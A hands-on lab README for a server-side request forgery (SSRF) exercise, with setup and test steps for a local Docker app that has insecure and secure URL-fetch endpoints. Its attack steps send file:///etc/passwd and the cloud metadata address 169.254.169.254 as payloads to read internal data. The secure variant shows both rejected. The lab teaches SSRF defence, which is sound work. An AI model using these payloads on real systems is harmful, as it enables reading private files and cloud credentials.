# SSRF Urllib

## Setup

* Step 1: Open terminal and change to lab directory

```bash
cd /root/ssrf-urllib
```

* Step 2: Build and run the docker

```bash
docker build -t app .
```

```bash
docker run -p 5000:5000 -it app
```

### Insecure variant

* Step 1: Now attack to see if you can read internal sensitive files

```bash
http GET http://localhost:5000/insecure/optimize url=file:///etc/passwd | jq -r '.data.raw_data' | base64 --decode
```

You should see the password entries dumped in plain text

* Step 2: Now attack to see if you can read internal sensitive url's

```bash
http GET http://localhost:5000/insecure/optimize url=http://169.254.169.254 | jq -r '.data.raw_data' | base64 --decode
```

You should see the API returning successful output here also

### Secure variant

* Step 1: Now attack to see if you can read internal sensitive files

```bash
http GET http://localhost:5000/secure/optimize url=file:///etc/passwd 
```

You should see the response as `Invalid URL`

* Step 2: Now attack to see if you can read internal sensitive url's

```bash
http GET http://localhost:5000/secure/optimize url=http://169.254.169.254 
```

You should see the response as `Invalid URL`
